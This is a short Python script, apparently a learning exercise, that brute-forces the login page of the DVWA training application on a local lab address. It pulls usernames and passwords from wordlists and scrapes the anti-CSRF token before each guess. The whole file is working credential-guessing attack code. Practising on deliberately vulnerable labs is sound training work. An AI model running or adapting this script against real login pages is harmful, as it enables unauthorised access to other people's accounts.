# -*- coding: utf-8 -*-
# author = 'K0ctr'


import requests
# import re
from bs4 import BeautifulSoup

ip = "192.168.203.128"
headers = {
    # "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
    "Cookie": "security=high; PHPSESSID=5qa8beu11tlu6s79pfdv2jluk7"
}

"""
# name只会循环一次，为什么？
for u in names:
    for p in pwds:
        print(u, p)
"""
with open("small.txt", 'r', encoding="utf-8") as names:
    for username in names:
        with open("common_pass.txt", 'r', encoding='utf-8') as passwords:
            for password in passwords:
                url = "http://%s/dvwa/vulnerabilities/brute/" % ip
                r = requests.get(url, headers=headers)
                soup = BeautifulSoup(r.text, "html.parser")
                token = soup.find_all("input")[3].get("value")
                # token = re.findall(r"(?<=<input type='hidden' name='user_token' value=').+?(?=' />)", r.text)[0]
                get_data = {
                    "user_token": token,
                    "username": username.strip(),
                    "password": password.strip(),
                    "Login": "Login"
                }
                print('-' * 20)
                print('用户名：', username.strip())
                print('密码：', password.strip())
                r = requests.get(url, params=get_data, headers=headers)
                if 'Username and/or password incorrect.' in r.text:
                    print('破解失败')
                else:
                    print('破解成功')
                print('-' * 20)
